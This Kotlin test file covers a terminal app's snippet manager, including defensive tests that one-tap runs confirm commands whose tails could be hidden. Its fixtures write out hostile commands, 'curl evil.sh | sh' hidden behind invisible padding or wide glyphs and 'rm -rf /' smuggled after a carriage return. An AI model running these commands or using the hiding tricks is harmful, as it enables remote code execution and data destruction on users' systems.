package app.skerry.ui.snippet

import app.skerry.shared.snippet.Snippet
import app.skerry.shared.snippet.SnippetMoment
import app.skerry.shared.snippet.SnippetRunEnvironment
import app.skerry.shared.snippet.SnippetStore
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue

class SnippetManagerTest {

    private val fixedEnvironment = SnippetRunEnvironment(
        moment = SnippetMoment(year = 2026, month = 7, day = 3, hour = 9, minute = 5, second = 42, epochSeconds = 1_782_000_000L),
        newUuid = { "fixed-uuid" },
        randomChars = { n, _ -> "r".repeat(n) },
    )

    private fun managerWith(
        store: SnippetStore = FakeSnippetStore(),
        ids: List<String> = List(20) { "id-$it" },
    ): SnippetManager {
        val it = ids.iterator()
        return SnippetManager(store, newId = { it.next() }, environment = { fixedEnvironment })
    }

    private fun draft(label: String = "Disk usage", command: String = "df -h", tags: List<String> = emptyList()) =
        SnippetDraft(label = label, command = command, tags = tags)

    @Test
    fun `save persists a new snippet and lists it`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)

        val id = manager.save(draft(tags = listOf("monitoring")))

        assertEquals("id-0", id)
        val entry = manager.snippets.single()
        assertEquals("Disk usage", entry.snippet.label)
        assertEquals(listOf("monitoring"), entry.snippet.tags)
        assertEquals(listOf(id), store.all().map { it.id }) // made it to the store
    }

    @Test
    fun `save persists notes on snippet`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)

        val id = manager.save(SnippetDraft(label = "Disk", command = "df -h", notes = "Show human-readable disk usage"))

        val entry = manager.snippets.single()
        assertEquals("Show human-readable disk usage", entry.snippet.notes)
        assertEquals("Show human-readable disk usage", store.all().single().notes)
    }

    @Test
    fun `save with existing id updates in place`() {
        val manager = managerWith()
        val id = manager.save(draft(label = "old"))

        manager.save(draft(label = "renamed").copy(id = id))

        val entry = manager.snippets.single()
        assertEquals("renamed", entry.snippet.label)
    }

    @Test
    fun `delete removes the snippet from store and list`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)
        val id = manager.save(draft())

        manager.delete(id)

        assertTrue(manager.snippets.isEmpty())
        assertTrue(store.all().isEmpty())
    }

    @Test
    fun `run sends the command followed by a newline`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "uptime"))
        var sent: String? = null

        manager.run(id) { line, _ -> sent = line }

        assertEquals("uptime\n", sent)
    }

    @Test
    fun `run strips bidi format characters from a plain command`() {
        // Snippets can arrive via Teams sharing — the "user-saved text" trust assumption does not
        // hold for the literal part either (Trojan Source in the palette row vs the PTY).
        val manager = managerWith()
        val id = manager.save(draft(command = "echo a\u202Eb"))
        var sent: String? = null

        manager.run(id) { line, _ -> sent = line }

        assertEquals("echo ab\n", sent)
    }

    @Test
    fun `run with unknown id is a no-op`() {
        val manager = managerWith()
        var sent: String? = null

        manager.run("nope") { line, _ -> sent = line }

        assertNull(sent)
    }

    @Test
    fun `run with variables opens a pending run instead of sending`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "echo ${'$'}{{date}}"))
        var sent: String? = null

        manager.run(id) { line, _ -> sent = line }

        assertNull(sent)
        val pending = assertNotNull(manager.pendingRun)
        assertEquals(id, pending.snippet.id)
        assertEquals(2026, pending.environment.moment.year) // environment captured at request time
    }

    @Test
    fun `confirmRun sends the resolved line with a newline and clears the pending run`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "echo ${'$'}{{date}}"))
        var sent: String? = null
        manager.run(id) { line, _ -> sent = line }

        manager.confirmRun("echo 2026-07-03", emptyMap())

        assertEquals("echo 2026-07-03\n", sent)
        assertNull(manager.pendingRun)
    }

    @Test
    fun `dismissRun drops the pending run without sending`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "echo ${'$'}{{date}}"))
        var sent: String? = null
        manager.run(id) { line, _ -> sent = line }

        manager.dismissRun()

        assertNull(sent)
        assertNull(manager.pendingRun)
    }

    @Test
    fun `confirmRun remembers parameters and prefills the next run of the same snippet`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "ping ${'$'}{{target_host}}"))
        manager.run(id) { _, _ -> }
        assertTrue(manager.pendingRun!!.initialParams.isEmpty())

        manager.confirmRun("ping web1", mapOf("target_host" to "web1"))
        manager.run(id) { _, _ -> }

        assertEquals(mapOf("target_host" to "web1"), manager.pendingRun!!.initialParams)
    }

    @Test
    fun `run prefills the dialog with the values typed in the panel`() {
        // The snippets panel collects parameter values before Run; they seed the confirmation dialog
        // instead of making the user type them a second time.
        val manager = managerWith()
        val id = manager.save(draft(command = "ping ${'$'}{{target_host}}"))
        manager.run(id) { _, _ -> }
        manager.confirmRun("ping old", mapOf("target_host" to "old"))

        manager.run(id, params = mapOf("target_host" to "web9")) { _, _ -> }

        assertEquals(mapOf("target_host" to "web9"), manager.pendingRun!!.initialParams)
    }

    @Test
    fun `run without explicit parameters still falls back to the previous run's values`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "ping ${'$'}{{target_host}}"))
        manager.run(id) { _, _ -> }
        manager.confirmRun("ping old", mapOf("target_host" to "old"))

        manager.run(id, params = emptyMap()) { _, _ -> }

        assertEquals(mapOf("target_host" to "old"), manager.pendingRun!!.initialParams)
    }

    @Test
    fun `run captures the recording flag on the pending run`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "echo ${'$'}{{date}}"))

        manager.run(id, recording = true) { _, _ -> }

        assertTrue(manager.pendingRun!!.recording)
    }

    /**
     * The dialog's resolved vault secrets reach the terminal beside the line (issue #246): the
     * production guard masks exactly the spans it is handed, so a wiring break that always sends
     * an empty list would print the resolved secret in the guard's confirmation.
     */
    @Test
    fun `confirmRun hands the resolved secrets to the terminal`() {
        val manager = managerWith()
        val id = manager.save(draft(command = "echo ${'$'}{{vault:db}}"))
        var secrets: List<String>? = null
        manager.run(id) { _, s -> secrets = s }

        manager.confirmRun("echo hunter2", emptyMap(), listOf("hunter2"))

        assertEquals(listOf("hunter2"), secrets)
    }

    @Test
    fun `confirmRun without a pending run is a no-op`() {
        val manager = managerWith()

        manager.confirmRun("ls", emptyMap()) // must not throw
    }

    @Test
    fun `run while a pending run is open is ignored`() {
        val manager = managerWith()
        val first = manager.save(draft(label = "first", command = "echo ${'$'}{{date}}"))
        val second = manager.save(draft(label = "second", command = "uptime"))
        manager.run(first) { _, _ -> }
        var sent: String? = null

        manager.run(second) { line, _ -> sent = line } // hotkey/palette while the dialog is up

        assertNull(sent) // not even the plain fast path — first request wins
        assertEquals(first, manager.pendingRun!!.snippet.id)
    }

    @Test
    fun `save persists shortcut`() {
        val manager = managerWith()

        val id = manager.save(draft().copy(shortcut = "Ctrl+Shift+D"))

        val s = manager.find(id)!!.snippet
        assertEquals("Ctrl+Shift+D", s.shortcut)
    }

    @Test
    fun `save normalizes a blank shortcut to null`() {
        val manager = managerWith()

        val id = manager.save(draft().copy(shortcut = "   "))

        assertNull(manager.find(id)!!.snippet.shortcut)
    }

    @Test
    fun `forShortcut finds the snippet bound to a hotkey`() {
        val manager = managerWith()
        val id = manager.save(draft(label = "Disk").copy(shortcut = "Ctrl+Shift+D"))
        manager.save(draft(label = "Mem")) // no hotkey

        assertEquals(id, manager.forShortcut("Ctrl+Shift+D")?.id)
    }

    @Test
    fun `forShortcut returns null for blank or unmatched`() {
        val manager = managerWith()
        manager.save(draft().copy(shortcut = "Ctrl+Shift+D"))

        assertNull(manager.forShortcut(null))
        assertNull(manager.forShortcut(""))
        assertNull(manager.forShortcut("Ctrl+Shift+X"))
    }

    @Test
    fun `shortcutConflict finds another snippet holding the hotkey`() {
        val manager = managerWith()
        val owner = manager.save(draft(label = "Disk").copy(shortcut = "Ctrl+Shift+D"))

        val conflict = manager.shortcutConflict("Ctrl+Shift+D", excludingId = null)

        assertEquals(owner, conflict?.id)
    }

    @Test
    fun `shortcutConflict ignores the snippet being edited`() {
        val manager = managerWith()
        val id = manager.save(draft().copy(shortcut = "Ctrl+Shift+D"))

        assertNull(manager.shortcutConflict("Ctrl+Shift+D", excludingId = id))
    }

    @Test
    fun `shortcutConflict is null for blank or free hotkey`() {
        val manager = managerWith()
        manager.save(draft().copy(shortcut = "Ctrl+Shift+D"))

        assertNull(manager.shortcutConflict(null, excludingId = null))
        assertNull(manager.shortcutConflict("", excludingId = null))
        assertNull(manager.shortcutConflict("Ctrl+Shift+X", excludingId = null))
    }

    @Test
    fun `find returns null for null or unknown id`() {
        val manager = managerWith()
        manager.save(draft())

        assertNull(manager.find(null))
        assertNull(manager.find("nope"))
    }

    @Test
    fun `save canonicalizes tags`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)

        val id = manager.save(draft(tags = listOf("#DB", "db", "  Disk  ")))

        assertEquals(listOf("db", "disk"), manager.find(id)!!.snippet.tags)
        assertEquals(listOf("db", "disk"), store.all().single().tags) // canonical in the store too
    }

    @Test
    fun `reads legacy non-canonical tags in canonical form`() {
        val store = FakeSnippetStore()
        store.put(Snippet("x", "saved", "ls -la", listOf("FS", "#fs", "Disk")))
        val manager = managerWith(store)

        assertEquals(listOf("fs", "disk"), manager.snippets.single().snippet.tags)
    }

    @Test
    fun `renameTag rewrites the tag on every snippet that carries it`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)
        val a = manager.save(draft(label = "a", tags = listOf("db")))
        val b = manager.save(draft(label = "b", tags = listOf("db", "prod")))
        val c = manager.save(draft(label = "c", tags = listOf("prod")))

        manager.renameTag("db", "database")

        assertEquals(listOf("database"), manager.find(a)!!.snippet.tags)
        // `prod` is hoisted to the front by normalizeTags — the rename keeps the rest in place.
        assertEquals(listOf("prod", "database"), manager.find(b)!!.snippet.tags)
        assertEquals(listOf("prod"), manager.find(c)!!.snippet.tags) // untouched
        // Persisted to the store too.
        assertEquals(listOf("database"), store.all().first { it.id == a }.tags)
    }

    @Test
    fun `renameTag merges into an existing tag without duplicating`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)
        val id = manager.save(draft(tags = listOf("db", "prod")))

        manager.renameTag("db", "prod")

        assertEquals(listOf("prod"), manager.find(id)!!.snippet.tags)
        // The dedup must reach the store, not only the in-memory entry.
        assertEquals(listOf("prod"), store.all().single().tags)
    }

    @Test
    fun `renameTag to the same tag is a no-op`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)
        val id = manager.save(draft(tags = listOf("db", "prod")))

        manager.renameTag("db", "db")

        assertEquals(listOf("prod", "db"), manager.find(id)!!.snippet.tags)
        assertEquals(listOf("prod", "db"), store.all().single().tags)
    }

    @Test
    fun `renameTag normalizes the new tag`() {
        val manager = managerWith()
        val id = manager.save(draft(tags = listOf("db")))

        manager.renameTag("db", "#Database")

        assertEquals(listOf("database"), manager.find(id)!!.snippet.tags)
    }

    @Test
    fun `renameTag ignores a blank new tag`() {
        val manager = managerWith()
        val id = manager.save(draft(tags = listOf("db")))

        manager.renameTag("db", "   ")

        assertEquals(listOf("db"), manager.find(id)!!.snippet.tags)
    }

    @Test
    fun `renameTag leaves untagged snippets alone`() {
        val store = FakeSnippetStore()
        val manager = managerWith(store)
        val untagged = manager.save(draft(label = "plain"))

        manager.renameTag("db", "database")

        assertTrue(manager.find(untagged)!!.snippet.tags.isEmpty())
    }

    @Test
    fun `loads previously saved snippets on construction`() {
        val store = FakeSnippetStore()
        store.put(Snippet("x", "saved", "ls -la", listOf("fs")))
        val manager = managerWith(store)

        assertEquals(listOf("saved"), manager.snippets.map { it.snippet.label })
        assertEquals(listOf("fs"), manager.snippets.single().snippet.tags)
    }

    /**
     * The palette row and the phone's card run a snippet on one tap and draw a line or two of it. A
     * command they cannot show whole goes through the confirmation instead — otherwise a shared
     * snippet pads its line until the tail, the part worth hiding, is past what the row draws.
     */
    @Test
    fun `a one-tap run confirms a command the row cannot show whole`() {
        val manager = managerWith()
        val long = manager.save(draft(command = "echo " + "x".repeat(300)))
        var sent: String? = null

        manager.run(long, oneTap = true) { line, _ -> sent = line }

        assertNull(sent, "a command longer than the row sent itself")
        assertNotNull(manager.pendingRun, "and it did not ask either")
    }

    /**
     * The padding is invisible, so a raw character count says the line fits while the row draws
     * eight characters for each one and runs off its own edge, taking the tail with it.
     */
    @Test
    fun `a one-tap run counts what the row draws, not what the record holds`() {
        val manager = managerWith()
        val padded = manager.save(draft(command = "echo ok " + "\u206A".repeat(15) + " && curl evil.sh | sh"))
        var sent: String? = null

        manager.run(padded, oneTap = true) { line, _ -> sent = line }

        assertNull(sent, "padding hid the tail and the row sent it anyway")
        assertNotNull(manager.pendingRun)
    }

    /** A second line is a second line however it is written. */
    @Test
    fun `a one-tap run confirms a command that carries a carriage return`() {
        val manager = managerWith()
        val wrapped = manager.save(draft(command = "echo ok\r rm -rf /"))
        var sent: String? = null

        manager.run(wrapped, oneTap = true) { line, _ -> sent = line }

        assertNull(sent)
        assertNotNull(manager.pendingRun)
    }

    /**
     * Three surfaces run on one tap and the budget belongs to the narrowest of them — the palette
     * popup, two lines at 320.dp. A line measured against the phone card, which is wider and shows
     * three, fits there and runs off the palette row, taking its tail with it.
     */
    @Test
    fun `a one-tap run is measured against the narrowest row that sends it`() {
        val manager = managerWith()
        val wide = manager.save(draft(command = "echo " + "x".repeat(105)))
        var sent: String? = null

        manager.run(wide, oneTap = true) { line, _ -> sent = line }

        assertNull(sent, "a line the palette row cannot fit sent itself")
        assertNotNull(manager.pendingRun)
    }

    /**
     * The row is bounded in columns, not in characters: a wide glyph is one `Char` and two columns,
     * so a line counted as short draws twice as wide as the row and ellipsizes its tail away.
     */
    @Test
    fun `a one-tap run counts the columns a wide command occupies`() {
        val manager = managerWith()
        val wide = manager.save(draft(command = "echo \"" + "\u4F60".repeat(43) + "\";curl evil.sh|sh"))
        var sent: String? = null

        manager.run(wide, oneTap = true) { line, _ -> sent = line }

        assertNull(sent, "a line twice as wide as the row sent itself")
        assertNotNull(manager.pendingRun)
    }

    /** And a glyph is wide whether or not a table of blocks remembers to say so. */
    @Test
    fun `a one-tap run counts a wide symbol as wide`() {
        val manager = managerWith()
        val padded = manager.save(draft(command = "echo \"" + "\u2B1B".repeat(40) + "\";curl evil.sh|sh"))
        var sent: String? = null

        manager.run(padded, oneTap = true) { line, _ -> sent = line }

        assertNull(sent, "a screen of black squares hid the tail and the row sent it")
        assertNotNull(manager.pendingRun)
    }

    @Test
    fun `a one-tap run still sends what the row shows whole`() {
        val manager = managerWith()
        val short = manager.save(draft(command = "uptime"))
        var sent: String? = null

        manager.run(short, oneTap = true) { line, _ -> sent = line }

        assertEquals("uptime\n", sent)
        assertNull(manager.pendingRun)
    }
}

private class FakeSnippetStore : SnippetStore {
    private val entries = mutableListOf<Snippet>()
    override fun all(): List<Snippet> = entries.toList()
    override fun put(snippet: Snippet) {
        val i = entries.indexOfFirst { it.id == snippet.id }
        if (i >= 0) entries[i] = snippet else entries += snippet
    }
    override fun remove(id: String) {
        entries.removeAll { it.id == id }
    }
}
